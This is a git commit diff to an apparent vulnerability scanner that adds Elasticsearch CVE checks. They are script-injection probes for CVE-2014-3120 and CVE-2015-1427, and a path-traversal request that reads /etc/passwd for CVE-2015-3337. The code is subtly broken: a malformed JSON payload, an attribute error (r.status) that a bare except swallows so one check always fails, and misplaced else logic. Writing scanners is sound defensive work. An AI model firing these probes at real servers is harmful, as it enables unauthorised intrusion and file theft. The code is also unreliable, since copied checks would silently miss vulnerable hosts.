95d8eba485acacb0d8ae0c0340a7318305a70f73
saucer-man <gyq0929@gmail.com>
2019-12-16 16:47:27 +0800

    add ELK cve detection

--- lib/poc.py
+++ lib/poc.py
@@ -174,9 +174,70 @@ def elasticsearch(host, port=9200):
     try:
         r = requests.get(f"http://{host}:{port}", timeout=timeout, allow_redirects=False, verify=False)
         if "You Know, for Search" in r.text:
-            color_print.red(f"[+] elasticsearch is not authorized to access：{host}:{port}")
+            if(elasticsearch_cve_2014_3120_rce_check(host, port)):
+                color_print.red(f"[+] elasticsearch cve-2014-3120：{host}:{port}")
+            if(elasticsearch_cve_2015_1427_rce_check(host, port)):
+                color_print.red(f"[+] elasticsearch cve-2015-1427：{host}:{port}")
+            if(elasticsearch_cve_2015_3337_rce_check(host, port)):
+                color_print.red(f"[+] elasticsearch cve-2015-3337：{host}:{port}")
+            else:
+                color_print.red(f"[+] elasticsearch is not authorized to access：{host}:{port}")
     except:
         pass  # traceback.print_exc()
+
+
+def elasticsearch_cve_2014_3120_rce_check(host, port=9200):
+    data = '''{
+    "size": 1,
+    "query": {
+      "filtered": {
+        "query": {
+          "match_all": {
+          }
+        }
+      }
+    },
+    "script_fields": {
+        "command": {
+            "script": "37182379+74892374"
+        }
+    }
+    }'''
+    try:
+        r = requests.post(f"http://{host}:{port}/_search?pretty", data=data, timeout=timeout)
+        if r.status_code == 200 and '112074753' in r.text:
+            return True
+    except:
+        pass
+    return False
+
+
+def elasticsearch_cve_2015_1427_rce_check(host, port=9200):
+    data = '''{
+    "size":1,
+    "script_fields": {
+       "secpulse": { "script":"372137931+31829038120",
+       "lang": "groovy"
+    }
+  }
+}}'''
+    try:
+        r = requests.post(f"http://{host}:{port}/_search?pretty", data=data, timeout=timeout)
+        if r.status_code == 200 and '32201176051' in r.text:
+            return True
+    except:
+        pass
+    return False
+
+
+def elasticsearch_cve_2015_3337_rce_check(host, port=9200):
+    try:
+        r = requests.get(f"http://{host}:{port}/_plugin/../../../../../../../../../../../etc/passwd")
+        if r.status == 200 and 'root' in r.text:
+            return True
+    except:
+        pass
+    return False
 
 
 def hadoop(host, port=8088):
